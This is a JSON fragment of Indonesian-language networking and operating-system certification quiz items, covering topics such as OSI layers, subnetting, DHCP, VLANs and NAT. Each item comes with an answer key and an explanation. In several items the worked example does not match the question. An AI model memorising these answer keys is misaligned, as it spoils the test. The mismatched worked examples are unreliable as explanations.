    "sourceRef": "CompTIA Network+: Chapter 1 (Open Systems Interconnection Model)",
    "scenario": "Seorang teknisi jaringan sedang menganalisis lalu lintas data menggunakan Wireshark. Di Layer 3 (Network Layer), unit data dikemas dengan header alamat IP asal dan tujuan.",
    "workedExample": {
      "kasusSerupa": "Menghitung jumlah total host IP address yang dapat digunakan pada subnet standar kelas C dengan prefix /24 (subnet mask 255.255.255.0).",
      "jawabanBenarContoh": "254 host valid (karena 2 pangkat 8 = 256, dikurangi 2 untuk Network ID dan Broadcast ID).",
      "nalarBayi": "Pada /24 ada 8 bit host (256 - 2 = 254). Bila prefix bertambah 2 bit menjadi /26 (mask 255.255.255.192), bit host tersisa 6, sehingga jumlah host validnya adalah (2 pangkat 6) - 2 = 62 host!."
    },
    "question": "Apakah nama Protocol Data Unit (PDU) pada Layer 3 (Network Layer) dalam model referensi 7 OSI?",
    "options": [
      "Frame",
      "Packet",
      "Segment",
      "Bit"
    ],
    "correctIndex": 1,
    "explanation": "Pada model OSI: Layer 1 PDU adalah Bit, Layer 2 adalah Frame (berisi header MAC), Layer 3 adalah Packet (berisi header IP), dan Layer 4 adalah Segment (TCP) atau Datagram (UDP).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-2",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Proses Inisiasi Koneksi Handshake 3 Arah TCP",
    "sourceRef": "CompTIA Network+: Chapter 2 (Transport Protocols)",
    "scenario": "Sebelum peramban web dapat mengunduh halaman dari server web melalui protokol TCP, kedua komputer harus melakukan sinkronisasi nomor urut paket dan konfirmasi kesiapan.",
    "workedExample": {
      "kasusSerupa": "Mengidentifikasi layer pada model OSI yang bertugas menangani transmisi bit biner mentah melalui kabel tembaga atau gelombang radio.",
      "jawabanBenarContoh": "Layer 1 - Physical Layer (Lapisan Fisik).",
      "nalarBayi": "Layer 1 mengurus sinyal listrik dan kabel."
    },
    "question": "Bagaimanakah urutan paket flag kontrol yang benar saat pembentukan koneksi TCP 3-Way Handshake?",
    "options": [
      "SYN -> SYN-ACK -> ACK",
      "ACK -> SYN -> SYN-ACK",
      "FIN -> ACK -> FIN-ACK",
      "RST -> SYN -> ACK"
    ],
    "correctIndex": 0,
    "explanation": "Klien mengirim SYN (Synchronize), server merespons dengan SYN-ACK (Synchronize-Acknowledge), dan klien menyelesaikan handshake dengan mengirim ACK (Acknowledge) sebelum data aplikasi ditransmisikan.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-3",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Perhitungan Subnetting CIDR /28 dan Jumlah Host Valid",
    "sourceRef": "Cisco CCNA 200-301: Chapter 8 (Subnetting IPv4)",
    "scenario": "Administrator jaringan ingin membagi segmen jaringan kantor menjadi beberapa subnet kecil untuk departemen marketing dengan prefix CIDR /28 (subnet mask 255.255.255.240).",
    "workedExample": {
      "kasusSerupa": "Mencegah terjadinya badai broadcast (broadcast storm) dan perulangan loop fisik yang dapat melumpuhkan seluruh switch di jaringan kantor.",
      "jawabanBenarContoh": "STP (Spanning Tree Protocol) — protokol switch yang memblokir jalur cadangan redundan sampai terjadi kegagalan.",
      "nalarBayi": "STP menghentikan loop pada switch Layer 2."
    },
    "question": "Berapakah jumlah alamat IP yang dapat digunakan untuk host (usable host IP addresses) pada subnet dengan notasi prefix /28?",
    "options": [
      "6 host",
      "14 host",
      "30 host",
      "16 host"
    ],
    "correctIndex": 1,
    "explanation": "Subnet mask /28 meminjam 4 bit host (32 - 28 = 4). Total alamat IP adalah 2^4 = 16. Karena alamat pertama untuk Network ID dan alamat terakhir untuk Broadcast ID tidak boleh diberikan ke komputer, host yang valid adalah 16 - 2 = 14.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-4",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Alokasi Rentang Alamat IP Privat Standar RFC 1918",
    "sourceRef": "CompTIA Network+: Chapter 3 (IP Addressing and Subnetting)",
    "scenario": "Seorang teknisi sedang mengkonfigurasi router kantor baru. ISP memberikan IP publik di port WAN. Pada antarmuka LAN lokal, teknisi harus memilih alamat IP privat yang tidak dapat dirouting langsung di internet publik.",
    "workedExample": {
      "kasusSerupa": "Mengisolasi lalu lintas data komputer divisi Keuangan dan HRD agar tidak dapat saling melihat broadcast paket data di switch yang sama.",
      "jawabanBenarContoh": "Membuat VLAN (Virtual LAN) terpisah untuk masing-masing divisi.",
      "nalarBayi": "VLAN memisahkan broadcast domain di switch."
    },
    "question": "Manakah di antara alamat IP berikut yang merupakan alamat IP PRIVAT yang valid untuk jaringan internal?",
    "options": [
      "200.100.50.25",
      "8.8.8.8",
      "150.10.0.1",
      "172.24.10.5"
    ],
    "correctIndex": 3,
    "explanation": "172.24.10.5 berada di dalam rentang IP privat Kelas B RFC 1918 (172.16.0.0 sampai 172.31.255.255). Alamat 8.8.8.8 adalah DNS Google publik, sedangkan yang lain adalah IP publik yang dapat dirouting di internet.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-5",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Mendiagnosa Alamat Fallback APIPA (169.254.x.x)",
    "sourceRef": "CompTIA Network+: Chapter 3 (Network Services & DHCP)",
    "scenario": "Pengguna kantor mengeluh tidak bisa membuka email dan file server. Saat dicek dengan `ipconfig`, adapter jaringan mendapatkan alamat IP `169.254.120.45` dengan subnet mask `255.255.0.0`.",
    "workedExample": {
      "kasusSerupa": "Menghubungkan dua switch kantor yang membawa lalu lintas banyak VLAN sekaligus melalui satu kabel uplink tunggal.",
      "jawabanBenarContoh": "Trunk Port dengan enkapsulasi standar IEEE 802.1Q (menambahkan VLAN tag pada frame).",
      "nalarBayi": "Trunk port membawa banyak VLAN dengan tag 802.1Q."
    },
    "question": "Jika sebuah komputer Windows mendapatkan alamat IP 169.254.x.x, permasalahan apakah yang sebenarnya terjadi?",
    "options": [
      "Router berhasil terhubung dengan kecepatan Gigabit penuh",
      "Kabel HDMI monitor mengalami korsleting",
      "Harddisk komputer mengalami bad sector pada Master Boot Record",
      "Komputer gagal berkomunikasi dengan server DHCP lokal untuk memperoleh konfigurasi IP"
    ],
    "correctIndex": 3,
    "explanation": "Alamat 169.254.0.0/16 adalah rentang APIPA (Link-Local). Sistem operasi Windows menetapkan alamat ini secara otomatis jika gagal menerima balasan DHCPOFFER dari server DHCP.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-6",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Pemetaan Record DNS: Record MX untuk Server Mail",
    "sourceRef": "CompTIA Network+: Chapter 4 (Domain Name System Architecture)",
    "scenario": "Perusahaan baru saja memigrasikan layanan email kantor ke server mail Google Workspace. Administrator domain harus menambahkan rekaman DNS baru di kontrol panel domain agar email yang dikirim ke @perusahaan.com sampai ke tujuan.",
    "workedExample": {
      "kasusSerupa": "Menghubungkan server DNS ke jaringan dengan konfigurasi IP manual permanen yang tidak pernah berubah-ubah.",
      "jawabanBenarContoh": "Static IP Assignment (Konfigurasi Alamat IP Statis secara manual).",
      "nalarBayi": "Server memakai IP statis agar alamatnya tetap."
    },
    "question": "Tipe DNS record manakah yang digunakan secara khusus untuk mengarahkan pengiriman email ke mail server tujuan dari sebuah domain?",
    "options": [
      "A (Host Address)",
      "MX (Mail Exchange)",
      "CNAME (Canonical Name)",
      "PTR (Pointer Record)"
    ],
    "correctIndex": 1,
    "explanation": "MX (Mail Exchange) record mengidentifikasi server surat yang bertanggung jawab menerima email masuk untuk domain tertentu dan mencakup nilai prioritas jika terdapat beberapa mail server.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-7",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Empat Langkah Alokasi IP Otomatis: Proses DORA DHCP",
    "sourceRef": "CompTIA Network+: Chapter 4 (Dynamic Host Configuration Protocol)",
    "scenario": "Saat komputer klien dicolokkan kabel LAN ke switch, terjadi pertukaran 4 paket data broadcast/unicast antara klien dan server DHCP sebelum IP address resmi terpasang.",
    "workedExample": {
      "kasusSerupa": "Melihat rincian tahapan proses sewa alamat IP pada protokol DHCP (DORA process).",
      "jawabanBenarContoh": "Tahap 1: DHCP Discover (Klien mencari server DHCP di jaringan).",
      "nalarBayi": "Protokol DHCP bekerja melalui pertukaran paket sistematis untuk mendistribusikan alamat IP secara otomatis kepada klien."
    },
    "question": "Manakah urutan kronologis yang benar dari proses alokasi alamat IP dinamis melalui protokol DHCP?",
    "options": [
      "Request -> Offer -> Discover -> Acknowledge",
      "Offer -> Discover -> Acknowledge -> Request",
      "Acknowledge -> Request -> Offer -> Discover",
      "Discover -> Offer -> Request -> Acknowledge (DORA)"
    ],
    "correctIndex": 3,
    "explanation": "Proses DHCP mengikuti akronim DORA: DHCPDISCOVER (klien mencari server), DHCPOFFER (server menawarkan IP), DHCPREQUEST (klien meminta IP yang ditawarkan), dan DHCPACK (server mengonfirmasi pemberian lease).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-8",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Segmentasi Jaringan Virtual LAN dan Protokol Trunking 802.1Q",
    "sourceRef": "Cisco CCNA 200-301: Chapter 11 (VLANs and Trunking)",
    "scenario": "Perusahaan ingin memisahkan lalu lintas jaringan departemen Keuangan (VLAN 10) dan HR (VLAN 20) pada switch yang sama demi keamanan, dan melewatkan kedua VLAN tersebut melalui satu kabel uplink ke switch core.",
    "workedExample": {
      "kasusSerupa": "Mengetahui fungsi utama DNS (Domain Name System) dalam menghubungkan nama situs web dengan server.",
      "jawabanBenarContoh": "DNS menerjemahkan nama domain yang mudah diingat manusia (seperti google.com) menjadi alamat IP numerik server tujuan.",
      "nalarBayi": "DNS adalah buku telepon internet penerjemah nama ke IP. Saat pengguna mengetik alamat di browser, DNS resolver bekerja mencari IP tujuan di server DNS!."
    },
    "question": "Standar protokol IEEE manakah yang digunakan untuk menandai (tagging) paket frame Ethernet agar beberapa VLAN dapat melintasi port trunk tunggal?",
    "options": [
      "IEEE 802.3af",
      "IEEE 802.1Q",
      "IEEE 802.11ax",
      "IEEE 802.1X"
    ],
    "correctIndex": 1,
    "explanation": "IEEE 802.1Q adalah standar industri untuk VLAN tagging pada link trunk Ethernet. Standar ini menyisipkan tag 4-byte yang berisi VLAN ID (1-4094) ke dalam frame 802.3.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-9",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Perintah Cisco IOS untuk Memeriksa Status Antarmuka",
    "sourceRef": "Cisco CCNA 200-301: Chapter 10 (Cisco Catalyst Switch CLI)",
    "scenario": "Administrator jaringan baru saja login ke switch Cisco melalui koneksi konsol SSH. Administrator ingin melihat ringkasan singkat seluruh port, status fisik (Status), dan status protokol (Protocol) beserta alamat IP-nya.",
    "workedExample": {
      "kasusSerupa": "Membedakan protokol transmisi data: TCP yang berorientasi koneksi (reliable) dengan jaminan kedatangan paket.",
      "jawabanBenarContoh": "TCP (Transmission Control Protocol) — menjamin pengiriman paket berurutan dengan acknowledgement dan retransmisi bila hilang.",
      "nalarBayi": "TCP handal karena ada tanda terima (cocok untuk web dan file)."
    },
    "question": "Perintah CLI Cisco manakah yang paling cepat dan umum digunakan untuk memeriksa ringkasan status operasional antarmuka (Up/Down) dan alamat IP-nya?",
    "options": [
      "display port status all",
      "ipconfig /all",
      "show running-config interface only",
      "show ip interface brief"
    ],
    "correctIndex": 3,
    "explanation": "`show ip interface brief` adalah perintah standar Cisco IOS untuk meninjau secara cepat daftar semua antarmuka, status layer 1 (Status: up/down), status layer 2 (Protocol: up/down), dan IP address yang terpasang.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-10",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Identifikasi Nomor Port Layanan Jaringan Standar IANA",
    "sourceRef": "CompTIA Network+: Chapter 2 (Well-Known Ports & Services)",
    "scenario": "Administrator firewall sedang mengonfigurasi aturan keamanan (Access Control List). Administrator harus mengizinkan traffic administrasi remote terenkripsi via Secure Shell (SSH) dan resolusi nama DNS.",
    "workedExample": {
      "kasusSerupa": "Mengetahui nomor port standar IANA untuk protokol transfer halaman web tanpa enkripsi (HTTP).",
      "jawabanBenarContoh": "Port 80 (HTTP).",
      "nalarBayi": "Setiap protokol web memiliki penetapan nomor port terstandarisasi untuk rute lalu lintas jaringan."
    },
    "question": "Nomor port standar IANA berapakah yang digunakan oleh protokol Secure Shell (SSH) untuk koneksi terminal jarak jauh terenkripsi?",
    "options": [
      "Port 53",
      "Port 22",
      "Port 23",
      "Port 80"
    ],
    "correctIndex": 1,
    "explanation": "Port 22 (TCP) ditetapkan untuk SSH (Secure Shell). Port 23 adalah Telnet (tidak terenkripsi), Port 53 adalah DNS, dan Port 80 adalah HTTP biasa.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-11",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Penerjemahan Alamat IP ke MAC Address melalui Protokol ARP",
    "sourceRef": "CompTIA Network+: Chapter 1 (Address Resolution Protocol)",
    "scenario": "Komputer A ingin mengirim frame Ethernet ke Komputer B di jaringan lokal yang sama. Komputer A mengetahui IP tujuan Komputer B (`192.168.1.50`), tetapi belum mengetahui alamat fisik MAC address dari kartu jaringan Komputer B.",
    "workedExample": {
      "kasusSerupa": "Mencari alamat IP dari nama domain host di internet menggunakan utilitas nslookup.",
      "jawabanBenarContoh": "DNS Query — mencari pemetaan nama domain ke alamat IP.",
      "nalarBayi": "DNS memetakan Nama ke IP."
    },
    "question": "Protokol manakah yang bertugas memetakan (resolving) alamat logika IP ke alamat fisik perangkat keras (MAC Address) pada jaringan lokal?",
    "options": [
      "ARP (Address Resolution Protocol)",
      "NAT (Network Address Translation)",
      "RARP (Reverse ARP)",
      "DNS (Domain Name System)"
    ],
    "correctIndex": 0,
    "explanation": "ARP (Address Resolution Protocol) bekerja di Layer 2/3 untuk menyelesaikan alamat IP ke MAC address perangkat target di subnet lokal yang sama menggunakan pesan ARP Request dan ARP Reply.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-12",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Utilitas Diagnostik Jaringan ICMP Echo Request & Reply",
    "sourceRef": "CompTIA Network+: Chapter 9 (Network Troubleshooting Utilities)",
    "scenario": "Untuk menguji apakah gateway router kantor dapat dijangkau dari PC teknisi, teknisi mengetik perintah `ping 192.168.1.1` di command line dan mengamati waktu latensi (round-trip time) dan packet loss.",
    "workedExample": {
      "kasusSerupa": "Menganalisis rute lompatan (hop) router yang dilalui paket data dari komputer kita menuju server tujuan di internet.",
      "jawabanBenarContoh": "Traceroute (tracert di Windows / traceroute di Linux) — melacak setiap router yang dilewati paket.",
      "nalarBayi": "Traceroute melacak rute hop."
    },
    "question": "Protokol pada Network Layer manakah yang mendasari mekanisme kerja utilitas `ping` dan `traceroute`?",
    "options": [
      "SNMP (Simple Network Management Protocol)",
      "ICMP (Internet Control Message Protocol)",
      "SMTP (Simple Mail Transfer Protocol)",
      "IGMP (Internet Group Management Protocol)"
    ],
    "correctIndex": 1,
    "explanation": "ICMP (Internet Control Message Protocol) adalah protokol pembantu IP yang mengirim pesan diagnostik dan pelaporan galat (seperti Destination Unreachable dan Time Exceeded saat traceroute).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-13",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Urutan Standar Crimping Kabel UTP T568B",
    "sourceRef": "CompTIA Network+: Chapter 5 (Cabling and Connectors)",
    "scenario": "Seorang teknisi jaringan sedang membuat kabel LAN patch cord lurus (straight-through) menggunakan kabel UTP Cat 6 dan konektor RJ-45 sesuai standar industri komersial T568B.",
    "workedExample": {
      "kasusSerupa": "Mengingat susunan kabel UTP standar T568A yang diawali oleh warna hijau.",
      "jawabanBenarContoh": "Standar T568A: Pin 1 adalah Putih-Hijau dan Pin 2 adalah Hijau.",
      "nalarBayi": "Pengkabelan terstruktur mengikuti bagan standar pinout untuk memastikan sinyal listrik terkirim sempurna."
    },
    "question": "Apakah warna kabel pada Pin 1 dan Pin 2 menurut standar kabel jaringan Ethernet T568B?",
    "options": [
      "Putih-Hijau dan Hijau",
      "Putih-Biru dan Biru",
      "Putih-Oranye dan Oranye",
      "Putih-Cokelat dan Cokelat"
    ],
    "correctIndex": 2,
    "explanation": "Standar EIA/TIA-568B dimulai dengan pasangan kabel oranye: Pin 1 = Putih-Oranye, Pin 2 = Oranye, Pin 3 = Putih-Hijau, Pin 4 = Biru, Pin 5 = Putih-Biru, Pin 6 = Hijau, Pin 7 = Putih-Cokelat, Pin 8 = Cokelat.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-14",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Fungsi Peran Default Gateway dalam Pengiriman Paket Antar-Subnet",
    "sourceRef": "Cisco CCNA 200-301: Chapter 5 (IPv4 Routing Concepts)",
    "scenario": "Komputer klien dengan IP `192.168.1.100/24` ingin mengakses server web Google dengan IP `142.250.190.46`. Komputer memeriksa subnet mask dan menyadari bahwa IP tujuan berada di luar jaringan lokalnya.",
    "workedExample": {
      "kasusSerupa": "Mengirimkan paket data ke sesama komputer di dalam satu subnet LAN yang sama tanpa melewati router.",
      "jawabanBenarContoh": "Pengiriman langsung melalui switch lokal menggunakan alamat MAC tujuan (Layer 2 Switching).",
      "nalarBayi": "Untuk komputer satu ruangan, switch langsung mengirimkan paket."
    },
    "question": "Alamat apakah yang harus dituju oleh komputer host ketika hendak mengirimkan paket data ke alamat IP yang berada di luar subnet lokalnya?",
    "options": [
      "Loopback 127.0.0.1",
      "DNS Root Server",
      "Default Gateway (Router lokal)",
      "Broadcast Address lokal"
    ],
    "correctIndex": 2,
    "explanation": "Default Gateway adalah alamat antarmuka router pada jaringan lokal yang bertindak sebagai jalur keluar utama bagi semua paket yang ditujukan ke host atau subnet di luar jaringan lokal tersebut.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-15",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Penghematan Alamat IPv4 melalui NAT / PAT (Overload)",
    "sourceRef": "CompTIA Network+: Chapter 3 (Network Address Translation)",
    "scenario": "Sebuah kantor memiliki 150 komputer karyawan yang semuanya aktif browsing internet bersamaan, tetapi penyedia jasa internet (ISP) hanya memberikan 1 buah alamat IP publik statis.",
    "workedExample": {
      "kasusSerupa": "Memetakan satu alamat IP publik ke tepat satu server privat internal secara satu banding satu (Static 1:1 NAT).",
      "jawabanBenarContoh": "Static NAT — satu IP privat dipetakan permanen ke satu IP publik khusus.",
      "nalarBayi": "Static NAT memetakan satu alamat IP lokal secara permanen ke satu alamat IP publik tertentu."
    },
    "question": "Teknologi translasi alamat manakah yang memungkinkan banyak host internal berbagi satu alamat IP publik dengan memanfaatkan nomor port sumber (source port) yang unik?",
    "options": [
      "Dual-Stack IPv6 Tunnel",
      "Dynamic NAT tanpa pooling port",
      "PAT (Port Address Translation / NAT Overload)",
      "Static 1-to-1 NAT"
    ],
    "correctIndex": 2,
    "explanation": "PAT (Port Address Translation), sering disebut NAT Overload, menerjemahkan banyak alamat IP privat internal ke satu alamat IP publik dengan membedakan setiap aliran sesi menggunakan nomor port TCP/UDP yang berbeda.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-16",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Ukuran MTU Ethernet Standar dan Fragmentasi Paket",
    "sourceRef": "CompTIA Network+: Chapter 2 (Ethernet Architecture)",
    "scenario": "Saat mengonfigurasi terowongan VPN antar kantor cabang, teknisi memperhatikan adanya penurunan kecepatan dan paket terfragmentasi karena ukuran frame melebihi Maximum Transmission Unit (MTU) default kabel Ethernet.",
    "workedExample": {
      "kasusSerupa": "Ukuran payload data Ethernet terkecil yang valid untuk menghindari tabrakan runt frame pada jaringan LAN.",
      "jawabanBenarContoh": "64 bytes (ukuran frame Ethernet minimum).",
      "nalarBayi": "Standar transmisi jaringan menentukan batas ukuran frame terendah untuk mencegah tabrakan sinyal."
    },
    "question": "Berapakah nilai default Maximum Transmission Unit (MTU) standar untuk payload paket IP pada jaringan kabel Ethernet?",
    "options": [
      "65535 bytes",
      "1500 bytes",
      "512 bytes",
      "9000 bytes (Jumbo Frame)"
    ],
    "correctIndex": 1,
    "explanation": "Ukuran MTU (Maximum Transmission Unit) default pada Ethernet standar adalah 1500 byte. Jika paket IP lebih besar dari MTU jalur, router harus memfragmentasi (memecah) paket tersebut kecuali bit 'Don't Fragment' (DF) aktif.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-17",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Karakteristik Frekuensi Wi-Fi: 2.4 GHz vs 5 GHz",
    "sourceRef": "CompTIA Network+: Chapter 6 (Wireless Networking)",
    "scenario": "Karyawan di gudang belakang kantor mengeluh sinyal Wi-Fi 5 GHz sangat lemah dan sering putus saat terhalang beberapa lapis dinding bata tebal, sedangkan sinyal Wi-Fi 2.4 GHz tetap terhubung dengan baik.",
    "workedExample": {
      "kasusSerupa": "Karakteristik sinyal Wi-Fi frekuensi 5 GHz yang menawarkan kecepatan transfer data sangat tinggi dan kanal yang tidak padat.",
      "jawabanBenarContoh": "Frekuensi 5 GHz memiliki gelombang lebih pendek: kecepatan tinggi namun jangkauan lebih pendek dan sulit tembus tembok.",
      "nalarBayi": "Frekuensi 5 GHz cepat tapi jangkauan pendek."
    },
    "question": "Mengapa frekuensi Wi-Fi 2.4 GHz umumnya memberikan jangkauan area yang lebih luas dan penetrasi dinding yang lebih baik dibandingkan frekuensi 5 GHz?",
    "options": [
      "Karena daya pancar antena router secara otomatis naik 10 kali lipat",
      "Karena tidak dipengaruhi oleh interferensi gelombang microwave",
      "Karena memiliki jumlah kanal frekuensi yang tidak bertumpukan lebih banyak",
      "Karena memiliki panjang gelombang yang lebih panjang sehingga redaman (atenuasi) melewati material padat lebih rendah"
    ],
    "correctIndex": 3,
    "explanation": "Frekuensi yang lebih rendah (2.4 GHz) memiliki panjang gelombang lebih panjang, memungkinkannya melewati hambatan fisik seperti dinding dan lantai dengan penurunan sinyal (atenuasi) yang lebih lambat dibanding frekuensi tinggi (5 GHz).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-18",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Pengamanan Port Switch Cisco: Fitur Port Security Violation Shutdown",
    "sourceRef": "Cisco CCNA 200-301: Chapter 13 (Securing Switch Access)",
    "scenario": "Administrator switch Cisco mengaktifkan fitur `switchport port-security` pada port FastEthernet 0/1. Ketika ada karyawan yang mencabut kabel PC kantor dan menancapkannya ke laptop pribadi yang memiliki MAC address tidak terdaftar, port langsung mati otomatis (err-disabled).",
    "workedExample": {
      "kasusSerupa": "Mengatur switch port security dengan tindakan 'Protect' yang membuang paket asing tanpa mematikan port switch.",
      "jawabanBenarContoh": "Protect Mode — paket dari MAC asing dibuang diam-diam tanpa menonaktifkan port switch.",
      "nalarBayi": "Mode Protect pada switch port security membuang frame liar tanpa memicu notifikasi peringatan log."
    },
    "question": "Mode aksi pelanggaran (violation mode) default pada fitur Cisco Switch Port Security yang langsung menonaktifkan port ke kondisi `err-disabled` adalah?",
    "options": [
      "Protect",
      "Restrict",
      "Shutdown",
      "Warning"
    ],
    "correctIndex": 2,
    "explanation": "Pada Cisco IOS Port Security, mode default adalah `shutdown`. Port akan langsung dimatikan (err-disabled), LED berubah oranye, log syslog dikirim, dan penghitung pelanggaran (violation counter) bertambah.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-19",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Alokasi Subnet Paling Efisien untuk Sambungan Serial WAN /30",
    "sourceRef": "Cisco CCNA 200-301: Chapter 8 (Subnetting Design)",
    "scenario": "Teknisi diminta mengalokasikan subnet IPv4 untuk sambungan point-to-point antara Router Cabang dan Router Pusat tanpa membuang-buang alamat IP yang berharga.",
    "workedExample": {
      "kasusSerupa": "Menghitung subnet mask untuk jaringan kantor kecil yang membutuhkan 10 sampai 14 host komputer klien.",
      "jawabanBenarContoh": "/28 (Subnet mask 255.255.255.240) yang menyediakan 14 host valid.",
      "nalarBayi": "Pada /28 tersedia 14 host."
    },
    "question": "Notasi prefix CIDR manakah yang secara tradisional paling efisien untuk link koneksi router point-to-point karena hanya menyediakan tepat 2 alamat host yang dapat digunakan?",
    "options": [
      "/31",
      "/28",
      "/29",
      "/30"
    ],
    "correctIndex": 3,
    "explanation": "Subnet /30 memiliki 2 bit host (2^2 = 4 total IP). Dikurangi 2 (Network dan Broadcast) menghasilkan tepat 2 usable IP, menjadikannya pilihan standar efisien untuk sambungan point-to-point antar-router.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-20",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Protokol Routing Interior: OSPF Link-State dan Algoritma Dijkstra",
    "sourceRef": "CompTIA Network+: Chapter 8 (Routing Protocols)",
    "scenario": "Dalam jaringan perusahaan berskala besar dengan ratusan router, tim insinyur memilih protokol routing Interior Gateway Protocol (IGP) yang memiliki konvergensi sangat cepat dan menghitung jalur terpendek menggunakan metrik Cost (bandwidth).",
    "workedExample": {
      "kasusSerupa": "Protokol routing jarak jauh antar-organisasi dan penyedia layanan internet (ISP) di seluruh dunia (Exterior Gateway Protocol).",
      "jawabanBenarContoh": "BGP (Border Gateway Protocol) — protokol routing standar tulang punggung internet global.",
      "nalarBayi": "BGP menghubungkan antar-negara dan ISP."
    },
    "question": "Protokol dynamic routing bertipe Link-State manakah yang secara luas digunakan di dalam jaringan enterprise internal dengan algoritma Shortest Path First (SPF)?",
    "options": [
      "OSPF (Open Shortest Path First)",
      "BGP (Border Gateway Protocol)",
      "EGP (Exterior Gateway Protocol)",
      "RIPv2 (Routing Information Protocol)"
    ],
    "correctIndex": 0,
    "explanation": "OSPF adalah protokol routing IGP bertipe link-state. Setiap router OSPF membanjiri link-state advertisements (LSA) dan membangun pohon topologi menggunakan algoritma Dijkstra SPF untuk menentukan rute terbaik.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-os-1",
    "category": "3. Sistem Operasi & CLI Troubleshooting (Windows & Linux)",
    "title": "Pembersihan Cache DNS Windows dengan ipconfig /flushdns",
    "sourceRef": "CompTIA A+ Core 2: Chapter 3 (Windows Command-Line Tools)",
    "scenario": "Website portal internal kantor baru saja dipindahkan ke server baru dengan alamat IP berbeda. Rekan kerja sudah bisa membuka web baru, namun PC teknisi masih terus diarahkan ke alamat IP server lama yang sudah mati.",
    "workedExample": {
      "kasusSerupa": "Memperbarui sewa alamat IP dari server DHCP pada komputer Windows melalui Command Prompt.",
      "jawabanBenarContoh": "ipconfig /renew — meminta perpanjangan sewa alamat IP baru dari DHCP server.",
      "nalarBayi": "Perintah jaringan pada sistem operasi memiliki parameter khusus untuk memperbarui sewa konfigurasi alamat."
    },
    "question": "Perintah Windows Command Line manakah yang digunakan untuk mengosongkan dan mengatur ulang isi cache resolver DNS lokal pada sistem?",
    "options": [
      "route -f",
      "ipconfig /flushdns",
      "netstat -r",
      "ipconfig /renew"
    ],
    "correctIndex": 1,
